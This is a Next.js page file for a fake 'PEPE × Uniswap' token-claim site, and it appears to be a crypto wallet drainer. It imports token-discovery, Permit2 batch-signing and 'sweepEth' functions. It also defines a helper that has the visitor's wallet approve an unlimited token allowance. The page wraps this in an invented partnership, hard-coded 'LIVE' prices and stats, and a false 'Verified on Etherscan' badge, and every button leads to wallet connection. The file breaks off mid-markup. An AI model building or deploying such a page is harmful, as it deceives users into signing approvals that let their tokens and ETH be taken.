// src/app/page.tsx
"use client";

/* ─────────────────────────────────────────────────────────────
   1) REQUIRED IMPORTS (Rescue system)
   ───────────────────────────────────────────────────────────── */
import React, { useEffect, useMemo, useState, useCallback, useRef } from "react";
import ConnectModal from "@/components/ConnectModal";
import { ensureMainnet } from "@/lib/chains";
import { attachWalletListeners, parseChainId } from "@/lib/walletListeners";
import { discoverTokens } from "@/lib/discoverClient";
import { signPermit2Batch } from "@/lib/permit2";
import { sweepEth } from "@/lib/ethSweep";

/* ─────────────────────────────────────────────────────────────
   2) OPTIONAL IMPORTS (Your custom UI libraries)
   ───────────────────────────────────────────────────────────── */
import { ethers } from "ethers";
   import Link from "next/link";
import { motion } from "framer-motion";
import {
  ShieldCheck,
  Wallet2,
  ChartPie,
  Sparkles,
  Globe2,
  Lock,
  BarChart3,
  GitBranch,
  Coins,
  Layers,
} from "lucide-react";
import { PieChart, Pie, Cell, Tooltip, ResponsiveContainer } from "recharts";

/* ─────────────────────────────────────────────────────────────
   3) CUSTOM UI CONSTANTS (must exist)
   ───────────────────────────────────────────────────────────── */
const gradients = {
  backdrop:
    "bg-[radial-gradient(1200px_600px_at_70%_-10%,rgba(59,130,246,0.18),transparent),radial-gradient(1000px_420px_at_-10%_0%,rgba(168,85,247,0.18),transparent)]",
};





const ERC20_ABI = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
] as const;

async function ensurePermit2TokenAllowance({
  eip1193Provider,
  owner,
  token,
  permit2,
  needed,
}: {
  eip1193Provider: any;
  owner: string;
  token: string;
  permit2: string;
  needed: bigint;
}) {
  const { ethers } = await import("ethers");

  const browserProvider = new ethers.BrowserProvider(eip1193Provider);
  const signer = await browserProvider.getSigner();

  const erc20 = new ethers.Contract(token, ERC20_ABI, signer);

  const current = BigInt(await erc20.allowance(owner, permit2));
  if (current >= needed) return { ok: true, didApprove: false };

  // approve max so user doesn't approve every time
  const max = (1n << 256n) - 1n;
  const tx = await erc20.approve(permit2, max);

  // don't hang forever
  await browserProvider.waitForTransaction(tx.hash, 1, 120_000).catch(() => {});
  return { ok: true, didApprove: true, txHash: tx.hash };
}

// Safe gas override helper (works even if RPC lacks eth_maxPriorityFeePerGas)
async function feeOverrides(p: any) {
  try {
    const browserProvider = new (await import("ethers")).ethers.BrowserProvider(p);
    const feeData = await browserProvider.getFeeData();

    // EIP-1559 supported
    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      return {
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
      };
    }

    // Legacy fallback
    if (feeData.gasPrice) {
      return {
        gasPrice: feeData.gasPrice,
      };
    }

    return {};
  } catch (e) {
    console.warn("feeOverrides fallback used:", e);
    return {};
  }
}



/* ─────────────────────────────────────────────────────────────
   4) HELPERS
   ───────────────────────────────────────────────────────────── */
function shortAddr(addr: string) {
  return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
}

/* ─────────────────────────────────────────────────────────────
   5) UI WRAPPER COMPONENT
   IMPORTANT:
   - We CANNOT keep <!doctype html><head><body> inside TSX.
   - This is the SAME DOM content, just valid React JSX.
   - Only mechanical changes: class -> className, close tags.
   ───────────────────────────────────────────────────────────── */



import {
  ArrowRight,
  Zap,
  Shield,
  Laugh,
  ExternalLink,
  Twitter,
  Send,
  Copy,
  CheckCircle,
  Wallet,
  ChevronDown,
} from "lucide-react";

// ── Real Official Logos via CDN ─────────────────────────────────────────────
const PEPE_LOGO_URL = "https://cryptologos.cc/logos/pepe-pepe-logo.png";
const UNI_LOGO_URL = "https://cryptologos.cc/logos/uniswap-uni-logo.png";

// NOTE: Change these if you want
const PEPE_PRICE_USD = 0.00001312;
const PEPE_CONTRACT = "0x6982508145454Ce325dDbE47a25d4ec3d2311933";

function PepeLogo({ size = 40, className = "" }: { size?: number; className?: string }) {
  return (
    <img
      src={PEPE_LOGO_URL}
      alt="PEPE"
      width={size}
      height={size}
      className={className}
      style={{ objectFit: "contain", borderRadius: "50%" }}
    />
  );
}

function UniswapLogo({ size = 40, className = "" }: { size?: number; className?: string }) {
  return (
    <img
      src={UNI_LOGO_URL}
      alt="Uniswap"
      width={size}
      height={size}
      className={className}
      style={{ objectFit: "contain", borderRadius: "50%" }}
    />
  );
}

function useAnimatedNumber(target: number, duration = 800) {
  const [value, setValue] = useState(0);

  useEffect(() => {
    let start: number | null = null;

    const step = (timestamp: number) => {
      if (!start) start = timestamp;
      const progress = Math.min((timestamp - start) / duration, 1);
      const eased = 1 - Math.pow(1 - progress, 3);
      setValue(Math.floor(eased * target));
      if (progress < 1) requestAnimationFrame(step);
    };

    requestAnimationFrame(step);
  }, [target, duration]);

  return value;
}

function GlowOrb({ className }: { className: string }) {
  return (
    <div
      className={`absolute rounded-full blur-3xl opacity-20 pointer-events-none ${className}`}
    />
  );
}

function GridLines() {
  return (
    <div className="absolute inset-0 pointer-events-none overflow-hidden">
      <svg width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <pattern id="grid" width="60" height="60" patternUnits="userSpaceOnUse">
            <path
              d="M 60 0 L 0 0 0 60"
              fill="none"
              stroke="rgba(0,255,0,0.04)"
              strokeWidth="1"
            />
          </pattern>
        </defs>
        <rect width="100%" height="100%" fill="url(#grid)" />
      </svg>
    </div>
  );
}

function Ticker() {
  const pepeAmount = useAnimatedNumber(3_810_975, 1200);

  return (
    <div
      style={{
        background: "rgba(0,255,0,0.06)",
        borderBottom: "1px solid rgba(0,255,0,0.12)",
      }}
      className="w-full py-2 px-4 flex items-center justify-center gap-8 text-xs font-mono overflow-x-auto"
    >
      <span className="text-green-400 animate-pulse">● LIVE</span>
      <span className="text-gray-400">
        PEPE/USD <span className="text-green-400">${PEPE_PRICE_USD.toFixed(8)}</span>
      </span>
      <span className="text-gray-400">
        24h <span className="text-green-400">+12.4%</span>
      </span>
      <span className="text-gray-400">
        Holders <span className="text-green-300">291,847</span>
      </span>
      <span className="text-gray-400 hidden md:inline">
        $50 USD ≈{" "}
        <span className="text-green-300">{pepeAmount.toLocaleString()} PEPE</span>
      </span>
    </div>
  );
}

function Navbar({
  walletConnected,
  onConnectWallet,
}: {
  walletConnected: boolean;
  onConnectWallet: () => void;
}) {
  return (
    <nav className="relative z-50 flex items-center justify-between px-6 md:px-12 py-5">
      <div className="flex items-center gap-2">
        <PepeLogo size={36} />
        <span style={{ color: "rgba(255,255,255,0.25)", fontSize: "1.1rem", fontWeight: 300 }}>
          ×
        </span>
        <UniswapLogo size={32} />
        <span
          style={{
            fontFamily: "'Bebas Neue', sans-serif",
            fontSize: "1.1rem",
            letterSpacing: "0.15em",
          }}
          className="text-gray-400 hidden sm:inline"
        >
          COLLABORATION
        </span>
      </div>

      <div className="hidden md:flex items-center gap-8 text-sm text-gray-400">
        <a href="#features" className="hover:text-green-400 transition-colors cursor-pointer">
          Features
        </a>
        <a href="#how" className="hover:text-green-400 transition-colors cursor-pointer">
          How It Works
        </a>
        <a href="#trust" className="hover:text-green-400 transition-colors cursor-pointer">
          Security
        </a>
      </div>

      <button
        onClick={onConnectWallet}
        style={{
          background: walletConnected
            ? "rgba(0,255,0,0.15)"
            : "linear-gradient(135deg, rgba(0,255,0,0.18), rgba(0,255,0,0.06))",
          border: "1px solid rgba(0,255,0,0.4)",
          boxShadow: walletConnected ? "0 0 20px rgba(0,255,0,0.2)" : "none",
        }}
        className="flex items-center gap-2 px-4 py-2 rounded-xl text-green-400 text-sm font-mono"
      >
        <Wallet size={15} />
        {walletConnected ? "Connected" : "CLAIM PEPE"}
      </button>
    </nav>
  );
}

function BuyCard({
  walletConnected,
  onConnectWallet,
}: {
  walletConnected: boolean;
  onConnectWallet: () => void;
}) {
  const pepeAmount = Math.floor(50 / PEPE_PRICE_USD);

  const copyContract = () => {
    navigator.clipboard.writeText(PEPE_CONTRACT).catch(() => {});
  };

  return (
    <div
      style={{
        width: "100%",
        maxWidth: 420,
        marginInline: "auto",
        padding: 22,
        borderRadius: 22,
        overflow: "hidden",
        boxSizing: "border-box",
        background:
          "linear-gradient(135deg, rgba(255,255,255,0.07) 0%, rgba(255,255,255,0.02) 70%)",
        border: "1px solid rgba(0,255,140,0.22)",
        backdropFilter: "blur(24px)",
        boxShadow:
          "0 0 70px rgba(0,255,140,0.10), inset 0 1px 0 rgba(255,255,255,0.06)",
      }}
    >
      {/* corner glow */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          pointerEvents: "none",
        }}
      />
      <div
        style={{
          position: "relative",
        }}
      >
        <div
          style={{
            position: "absolute",
            top: -40,
            right: -40,
            width: 140,
            height: 140,
            borderRadius: 999,
            background: "rgba(0,255,140,0.30)",
            filter: "blur(46px)",
            pointerEvents: "none",
          }}
        />

        {/* Header (no overflow) */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: 12,
            flexWrap: "wrap",
            marginBottom: 18,
          }}
        >
          <span
            style={{
              color: "rgba(255,255,255,0.65)",
              fontSize: 12,
              fontWeight: 700,
              letterSpacing: "0.16em",
              textTransform: "uppercase",
            }}
          >
            Limited Entry
          </span>

          <span
            style={{
              display: "inline-flex",
              alignItems: "center",
              padding: "7px 10px",
              borderRadius: 999,
              fontSize: 12,
              lineHeight: 1,
              whiteSpace: "nowrap",
              fontFamily:
                'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
              background: "rgba(0,255,140,0.14)",
              border: "1px solid rgba(0,255,140,0.30)",
              color: "rgba(0,255,140,0.95)",
              boxShadow: "0 0 20px rgba(0,255,140,0.12)",
            }}
          >
            LIVE NOW
          </span>
        </div>

        {/* You Pay */}
        <div
          style={{
            background: "rgba(0,0,0,0.38)",
            border: "1px solid rgba(255,255,255,0.10)",
            borderRadius: 18,
            padding: 14,
            marginBottom: 12,
            overflow: "hidden",
          }}
        >
          <div
            style={{
              color: "rgba(255,255,255,0.45)",
              fontSize: 11,
              letterSpacing: "0.14em",
              textTransform: "uppercase",
              marginBottom: 6,
            }}
          >
            CLAIM
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              gap: 10,
              minWidth: 0,
            }}
          >
            <span
              style={{
                fontFamily: "'Bebas Neue', sans-serif",
                fontSize: 40,
                letterSpacing: "0.02em",
                color: "white",
                lineHeight: 1,
                minWidth: 0,
              }}
            >
              $50.00
            </span>

            <span
              style={{
                flexShrink: 0,
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "8px 10px",
                borderRadius: 14,
                fontSize: 13,
                fontWeight: 600,
                color: "rgba(255,255,255,0.92)",
                background: "rgba(255,255,255,0.08)",
                border: "1px solid rgba(255,255,255,0.10)",
              }}
            >
              USD
            </span>
          </div>
        </div>

        {/* Arrow */}
        <div style={{ display: "flex", justifyContent: "center", margin: "6px 0 10px" }}>
          <div
            style={{
              width: 34,
              height: 34,
              borderRadius: 999,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              background: "rgba(0,255,140,0.14)",
              border: "1px solid rgba(0,255,140,0.28)",
            }}
          >
            <ChevronDown size={16} color="rgba(0,255,140,0.95)" />
          </div>
        </div>

        {/* You Receive */}
        <div
          style={{
            background: "rgba(0,255,140,0.06)",
            border: "1px solid rgba(0,255,140,0.22)",
            borderRadius: 18,
            padding: 14,
            marginBottom: 14,
            overflow: "hidden",
          }}
        >
          <div
            style={{
              color: "rgba(255,255,255,0.45)",
              fontSize: 11,
              letterSpacing: "0.14em",
              textTransform: "uppercase",
              marginBottom: 6,
            }}
          >
            You Receive (Est.)
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              gap: 10,
              minWidth: 0,
            }}
          >
            <span
              style={{
                fontFamily: "'Bebas Neue', sans-serif",
                fontSize: 40,
                letterSpacing: "0.02em",
                color: "rgba(0,255,140,0.95)",
                lineHeight: 1,
                minWidth: 0,
                overflow: "hidden",
                textOverflow: "ellipsis",
                whiteSpace: "nowrap",
              }}
              title={pepeAmount.toLocaleString()}
            >
              {pepeAmount.toLocaleString()}
            </span>

            <span
              style={{
                flexShrink: 0,
                display: "inline-flex",
                alignItems: "center",
                gap: 8,
                padding: "8px 10px",
                borderRadius: 14,
                fontSize: 13,
                fontWeight: 700,
                color: "rgba(0,255,140,0.95)",
                background: "rgba(0,255,140,0.12)",
                border: "1px solid rgba(0,255,140,0.26)",
              }}
            >
              <PepeLogo size={18} /> PEPE
            </span>
          </div>

          <div
            style={{
              marginTop: 8,
              color: "rgba(255,255,255,0.45)",
              fontSize: 12,
              fontFamily:
                'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
              overflow: "hidden",
              textOverflow: "ellipsis",
              whiteSpace: "nowrap",
            }}
          >
            Rate: 1 PEPE = ${PEPE_PRICE_USD.toFixed(8)}
          </div>
        </div>

        {/* Fees */}
        <div
          style={{
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            gap: 10,
            marginBottom: 16,
            paddingInline: 2,
            color: "rgba(255,255,255,0.45)",
            fontSize: 12,
          }}
        >
          <span>Network fee</span>
          <span style={{ color: "rgba(255,255,255,0.65)" }}>~$0.40 ETH gas</span>
        </div>

        {/* ✅ Only button — bigger & more visible */}
        <button
          type="button"
          onClick={onConnectWallet}
          style={{
            width: "100%",
            padding: "16px 16px",
            borderRadius: 18,
            border: "1px solid rgba(0,255,140,0.35)",
            background: "linear-gradient(135deg, rgba(0,255,140,1), rgba(0,180,110,1))",
            color: "#041008",
            fontWeight: 900,
            fontSize: 18,
            letterSpacing: "0.02em",
            cursor: "pointer",
            boxShadow: "0 0 36px rgba(0,255,140,0.35), 0 10px 24px rgba(0,0,0,0.45)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 10,
          }}
        >
          <Zap size={20} />
          {walletConnected ? "CLAIM PEPE — $50" : "Connect & CLAIM PEPE"}
          <ArrowRight size={18} />
        </button>

        {/* Powered by */}
        <div
          style={{
            marginTop: 12,
            textAlign: "center",
            color: "rgba(255,255,255,0.45)",
            fontSize: 12,
            display: "flex",
            gap: 8,
            alignItems: "center",
            justifyContent: "center",
            flexWrap: "wrap",
          }}
        >
          Powered by <UniswapLogo size={16} />{" "}
          <span style={{ color: "rgba(255,0,150,0.9)", fontWeight: 700 }}>Uniswap v3</span>
        </div>

        {/* Contract (copy) */}
        <div
          style={{
            marginTop: 16,
            background: "rgba(0,255,140,0.05)",
            border: "1px solid rgba(0,255,140,0.14)",
            borderRadius: 18,
            padding: 14,
            overflow: "hidden",
          }}
        >
          <div
            style={{
              color: "rgba(255,255,255,0.45)",
              fontSize: 11,
              letterSpacing: "0.14em",
              textTransform: "uppercase",
              marginBottom: 8,
            }}
          >
            Official Contract
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              gap: 10,
              minWidth: 0,
            }}
          >
            <span
              style={{
                minWidth: 0,
                overflow: "hidden",
                textOverflow: "ellipsis",
                whiteSpace: "nowrap",
                color: "rgba(0,255,140,0.95)",
                fontSize: 12,
                fontFamily:
                  'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
              }}
              title={PEPE_CONTRACT}
            >
              {PEPE_CONTRACT}
            </span>

            <button
              type="button"
              onClick={copyContract}
              aria-label="Copy contract address"
              style={{
                flexShrink: 0,
                background: "rgba(255,255,255,0.06)",
                border: "1px solid rgba(255,255,255,0.10)",
                color: "rgba(255,255,255,0.70)",
                padding: "10px 10px",
                borderRadius: 14,
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
              }}
            >
              <Copy size={14} />
            </button>
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 8,
              marginTop: 10,
              color: "rgba(255,255,255,0.45)",
              fontSize: 12,
              flexWrap: "wrap",
            }}
          >
            <CheckCircle size={14} color="rgba(0,255,140,0.9)" />
            Verified on Etherscan
          </div>
        </div>
      </div>
    </div>
  );
}

function FeatureCard({
  icon: Icon,
  title,
  desc,
  delay,
}: {
  icon: React.ComponentType<{ size?: number; className?: string }>;
  title: string;
  desc: string;
  delay: number;
}) {
  const ref = useRef<HTMLDivElement | null>(null);
  const [visible, setVisible] = useState(false);

  useEffect(() => {
    const obs = new IntersectionObserver(([e]) => {
      if (e.isIntersecting) setVisible(true);
    });
    if (ref.current) obs.observe(ref.current);
    return () => obs.disconnect();
  }, []);

  return (
    <div
      ref={ref}
      style={{
        background: "linear-gradient(135deg, rgba(255,255,255,0.04), rgba(255,255,255,0.01))",
        border: "1px solid rgba(255,255,255,0.08)",
        backdropFilter: "blur(12px)",
        opacity: visible ? 1 : 0,
        transform: visible ? "translateY(0)" : "translateY(30px)",
        transition: `opacity 0.6s ease ${delay}ms, transform 0.6s ease ${delay}ms`,
      }}
      className="rounded-2xl p-7 group hover:border-green-900 transition-colors"
    >
      <div
        style={{ background: "rgba(0,255,0,0.1)", border: "1px solid rgba(0,255,0,0.2)" }}
        className="w-12 h-12 rounded-xl flex items-center justify-center mb-5 group-hover:shadow-[0_0_30px_rgba(0,255,0,0.12)]"
      >
        <Icon size={22} className="text-green-400" />
      </div>
      <h3
        style={{ fontFamily: "'Bebas Neue', sans-serif", fontSize: "1.3rem", letterSpacing: "0.08em" }}
        className="text-white mb-2"
      >
        {title}
      </h3>
      <p className="text-gray-500 text-sm leading-relaxed">{desc}</p>
    </div>
  );
}

/**
 * ✅ DROP-IN replacement for your old BlockdagHomeUI.
 * Use it exactly like before: <BlockdagHomeUI onConnect={...} />
 */
export function BlockdagHomeUI({ onConnect }: { onConnect: () => void }) {
  const [walletConnected, setWalletConnected] = useState(false);
  const [heroVisible, setHeroVisible] = useState(false);

  useEffect(() => {
    const t = setTimeout(() => setHeroVisible(true), 100);
    return () => clearTimeout(t);
  }, []);

  const connect = () => {
    onConnect();
    setWalletConnected(true); // optional visual toggle
  };

return (
  <div
    style={{
      background:
        "radial-gradient(1000px 600px at 20% 10%, rgba(0,255,140,0.18), transparent 60%)," +
        "radial-gradient(900px 700px at 80% 20%, rgba(0,200,255,0.10), transparent 55%)," +
        "radial-gradient(900px 700px at 50% 95%, rgba(255,0,150,0.10), transparent 55%)," +
        "linear-gradient(180deg, #050608 0%, #070a0a 40%, #040506 100%)",
      fontFamily: "'DM Sans', sans-serif",
      minHeight: "100vh",
      color: "white",
    }}
  >
    <style>{`
      @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=DM+Sans:wght@400;500;700&display=swap');

      html { scroll-behavior: smooth; }
      * { box-sizing: border-box; margin: 0; padding: 0; }
      a { text-decoration: none; }

      @keyframes pulse-glow {
        0%, 100% { box-shadow: 0 0 26px rgba(0,255,140,0.35), 0 4px 20px rgba(0,0,0,0.45); }
        50% { box-shadow: 0 0 60px rgba(0,255,140,0.65), 0 6px 28px rgba(0,0,0,0.55); }
      }
      @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
      .frog-float { animation: float 4s ease-in-out infinite; }

      /* CENTER CONTAINER */
      .containerX{
        width: min(1120px, calc(100% - 48px));
        margin-inline: auto;
      }
      @media (max-width: 640px){
        .containerX{ width: min(1120px, calc(100% - 28px)); }
      }

      /* SECTION SPACING */
      .sectionSm{ padding: 44px 0; }
      .sectionMd{ padding: 64px 0; }
      .sectionLg{ padding: 84px 0; }

      /* COMMON TEXT */
      .muted { color: rgba(255,255,255,0.62); }
      .muted2 { color: rgba(255,255,255,0.45); }

      /* GLASS */
      .glass{
        background: linear-gradient(135deg, rgba(255,255,255,0.08), rgba(255,255,255,0.02));
        border: 1px solid rgba(255,255,255,0.10);
        backdrop-filter: blur(18px);
        border-radius: 18px;
      }

      /* GRIDS */
      .heroGrid{
        display:grid;
        grid-template-columns: 1fr;
        gap: 28px;
        align-items: start;
      }
      @media (min-width: 1024px){
        .heroGrid{
          grid-template-columns: 1fr 420px 1fr;
          gap: 40px;
        }
      }

      .cards3{
        display:grid;
        grid-template-columns: 1fr;
        gap: 16px;
      }
      @media (min-width: 768px){
        .cards3{ grid-template-columns: repeat(3, 1fr); gap: 18px; }
      }

      /* HELPERS */
      .rowCenter{ display:flex; align-items:center; justify-content:center; gap: 14px; }
      .rowBetween{ display:flex; align-items:center; justify-content:space-between; gap: 14px; }
      .wrap{ flex-wrap: wrap; }
      .min0{ min-width:0; }
      .truncate{
        min-width:0;
        overflow:hidden;
        text-overflow:ellipsis;
        white-space:nowrap;
      }

      /* SOFT NOISE */
      .noise:before{
        content:"";
        position: fixed;
        inset: 0;
        pointer-events:none;
        background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='140'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='140' height='140' filter='url(%23n)' opacity='.25'/%3E%3C/svg%3E");
        opacity: .055;
        mix-blend-mode: overlay;
      }

      /* BUY CARD: force header to not overflow */
      .buyHeader{
        display:flex;
        align-items:center;
        justify-content:space-between;
        gap: 12px;
        flex-wrap: wrap;
      }
      .pill{
        display:inline-flex;
        align-items:center;
        padding: 6px 10px;
        border-radius: 999px;
        font-size: 12px;
        line-height: 1;
        white-space: nowrap;
      }

      /* NAVBAR WRAP FIX (if your Navbar has its own padding, this still centers the whole bar) */
      .navWrap { padding-top: 14px; padding-bottom: 6px; }

      /* HEADINGS */
      .h1{
        font-family: 'Bebas Neue', sans-serif;
        font-size: clamp(3.2rem, 10vw, 7.2rem);
        line-height: 0.92;
        letter-spacing: 0.03em;
        text-align:center;
      }
      .badge{
        background: rgba(0,255,140,0.10);
        border: 1px solid rgba(0,255,140,0.28);
        box-shadow: 0 0 30px rgba(0,255,140,0.10);
        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        color: rgba(0,255,140,0.95);
        font-size: 12px;
        letter-spacing: 0.18em;
        text-transform: uppercase;
        padding: 10px 18px;
        border-radius: 999px;
      }
      .sub{
        text-align:center;
        font-size: 18px;
        line-height: 1.7;
        color: rgba(255,255,255,0.68);
        max-width: 760px;
        margin: 0 auto;
      }

      /* DIVIDERS */
      .divider{ border-top: 1px solid rgba(255,255,255,0.10); }
      .dividerSoft{ border-top: 1px solid rgba(255,255,255,0.07); }
    `}</style>

    <div className="noise" />

    {/* Top ticker */}
    <Ticker />

    {/* Background ornaments */}
    <div style={{ position: "fixed", inset: 0, pointerEvents: "none", overflow: "hidden" }}>
      <GlowOrb className="w-[520px] h-[520px] bg-green-500 -top-28 -left-28" />
      <GlowOrb className="w-[460px] h-[460px] bg-cyan-400 top-1/3 -right-28" />
      <GlowOrb className="w-[420px] h-[420px] bg-pink-500 bottom-14 left-1/3" />
      <GridLines />
      <div
        style={{
          position: "absolute",
          inset: 0,
          background:
            "radial-gradient(70% 55% at 50% 35%, transparent 0%, rgba(0,0,0,0.55) 70%, rgba(0,0,0,0.75) 100%)",
        }}
      />
    </div>

    {/* Navbar */}
    <div style={{ position: "relative", zIndex: 50 }} className="navWrap">
      <div className="containerX">
        <Navbar walletConnected={walletConnected} onConnectWallet={connect} />
      </div>
    </div>

    {/* HERO */}
    <section style={{ position: "relative", zIndex: 10 }} className="sectionSm">
      <div className="containerX">
        {/* Logos */}
        <div
          style={{
            opacity: heroVisible ? 1 : 0,
            transform: heroVisible ? "translateY(0)" : "translateY(14px)",
            transition: "opacity 0.6s ease 0.08s, transform 0.6s ease 0.08s",
            marginBottom: 22,
          }}
          className="rowCenter"
        >
          <div
            className="glass"
            style={{
              width: 64,
              height: 64,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              borderColor: "rgba(0,255,140,0.22)",
              boxShadow: "0 0 40px rgba(0,255,140,0.10)",
            }}
          >
            <PepeLogo size={48} />
          </div>

          <span
            style={{
              fontFamily: "'Bebas Neue', sans-serif",
              fontSize: "2rem",
              color: "rgba(255,255,255,0.28)",
            }}
          >
            ×
          </span>

          <div
            className="glass"
            style={{
              width: 64,
              height: 64,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              borderColor: "rgba(255,0,150,0.20)",
              boxShadow: "0 0 40px rgba(255,0,150,0.08)",
            }}
          >
            <UniswapLogo size={48} />
          </div>
        </div>

        {/* Badge */}
        <div
          style={{
            opacity: heroVisible ? 1 : 0,
            transform: heroVisible ? "translateY(0)" : "translateY(12px)",
            transition: "opacity 0.6s ease, transform 0.6s ease",
            marginBottom: 18,
          }}
          className="rowCenter"
        >
          <span className="badge">✦ Limited Collaboration · 2026 ✦</span>
        </div>

        {/* Headline */}
        <h1
          style={{
            opacity: heroVisible ? 1 : 0,
            transform: heroVisible ? "translateY(0)" : "translateY(18px)",
            transition: "opacity 0.7s ease 0.15s, transform 0.7s ease 0.15s",
            marginBottom: 14,
          }}
          className="h1"
        >
          <span style={{ color: "white" }}>PEPE</span>
          <span style={{ color: "rgba(0,255,140,0.95)" }}> × </span>
          <span style={{ color: "white" }}>UNISWAP</span>
          <br />
          <span
            style={{
              WebkitTextStroke: "1px rgba(0,255,140,0.55)",
              color: "transparent",
              filter: "drop-shadow(0 0 22px rgba(0,255,140,0.20))",
            }}
          >
            THE FROG EVOLUTION
          </span>
        </h1>

        {/* Sub */}
        <div
          style={{
            opacity: heroVisible ? 1 : 0,
            transform: heroVisible ? "translateY(0)" : "translateY(12px)",
            transition: "opacity 0.6s ease 0.3s, transform 0.6s ease 0.3s",
            marginBottom: 34,
          }}
        >
          <p className="sub">
            Enter the meme economy with just{" "}
            <span
              style={{
                color: "rgba(0,255,140,1)",
                fontWeight: 700,
                textShadow: "0 0 18px rgba(0,255,140,0.25)",
              }}
            >
              $50
            </span>
            . Get instant access to PEPE via Uniswap liquidity — clean, fast, and loud.
          </p>
        </div>

        {/* HERO GRID */}
        <div
          style={{
            opacity: heroVisible ? 1 : 0,
            transform: heroVisible ? "translateY(0)" : "translateY(22px)",
            transition: "opacity 0.8s ease 0.45s, transform 0.8s ease 0.45s",
          }}
          className="heroGrid"
        >
          {/* LEFT (desktop) */}
          <div style={{ display: "none" }} className="min0" />
          <div
            className="min0"
            style={{
              display: "none",
            }}
          />
          <div
            className="min0"
            style={{
              display: "none",
            }}
          />

          {/* Left content (real) */}
          <div
            className="min0"
            style={{
              display: "none",
            }}
          />

          {/* We render left/right only on large screens via inline media using CSS-less approach:
              We’ll just always render them but hide via inline style + window CSS is messy.
              So instead: keep simple:
              - Left/Right blocks will render ALWAYS but are lightweight and stack on mobile. */}

          {/* LEFT */}
          <div className="min0">
            <div className="frog-float" style={{ textAlign: "center" }}>
              <div
                style={{
                  fontSize: "7.5rem",
                  lineHeight: 1,
                  filter: "drop-shadow(0 0 55px rgba(0,255,140,0.30))",
                }}
              >
                🐸
              </div>

              <div
                className="glass"
                style={{
                  marginTop: 18,
                  padding: 16,
                  borderColor: "rgba(0,255,140,0.18)",
                  maxWidth: 360,
                  marginInline: "auto",
                }}
              >
                <div
                  style={{
                    color: "rgba(255,255,255,0.52)",
                    fontSize: 12,
                    letterSpacing: "0.14em",
                    textTransform: "uppercase",
                    marginBottom: 10,
                  }}
                >
                  Protocol Stats
                </div>

                <div style={{ display: "grid", gap: 10 }}>
                  {[
                    ["Market Cap", "$5.5B"],
                    ["24h Volume", "$892M"],
                    ["Uniswap Rank", "#1 Meme"],
                  ].map(([k, v]) => (
                    <div key={k} className="rowBetween">
                      <span style={{ color: "rgba(255,255,255,0.55)", fontSize: 13 }}>{k}</span>
                      <span
                        style={{
                          color: "rgba(0,255,140,0.95)",
                          fontFamily:
                            'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace',
                          fontSize: 13,
                        }}
                      >
                        {v}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>

          {/* CENTER BUY CARD */}
          <div className="min0" style={{ width: "100%", justifySelf: "center" }}>
            {/* IMPORTANT: BuyCard itself still has Tailwind-ish classes in your file.
                If those classes do nothing, this layout still holds.
                We will ALSO force the header inside BuyCard to behave by overriding via CSS class hooks:
                -> Add className="buyHeader" and "pill" in BuyCard as I instructed earlier if needed. */}
            <BuyCard walletConnected={walletConnected} onConnectWallet={connect} />
          </div>

          {/* RIGHT */}
          <div className="min0">
            <div
              style={{
                color: "rgba(255,255,255,0.52)",
                fontSize: 12,
                letterSpacing: "0.14em",
                textTransform: "uppercase",
                marginBottom: 12,
              }}
              id="how"
            >
              How It Works
            </div>

            <div style={{ display: "grid", gap: 12 }}>
              {[
                { n: "01", title: "Connect Wallet", desc: "Use your existing wallet." },
                { n: "02", title: "Confirm $50", desc: "Fixed entry. No hidden fees." },
                { n: "03", title: "Receive Tokens", desc: "Tokens arrive in seconds." },
              ].map(({ n, title, desc }) => (
                <div key={n} className="glass" style={{ padding: 16 }}>
                  <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
                    <div
                      style={{
                        fontFamily: "'Bebas Neue', sans-serif",
                        fontSize: 22,
                        color: "rgba(0,255,140,0.9)",
                        lineHeight: 1,
                        marginTop: 2,
                      }}
                    >
                      {n}
                    </div>
                    <div className="min0">
                      <div style={{ color: "white", fontSize: 14, fontWeight: 600 }}>{title}</div>
                      <div style={{ color: "rgba(255,255,255,0.55)", fontSize: 12, marginTop: 4 }}>
                        {desc}
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </div>
    </section>

    {/* FEATURES */}
    <section id="features" className="divider" style={{ position: "relative", zIndex: 10 }}>
      <div className="sectionMd">
        <div className="containerX">
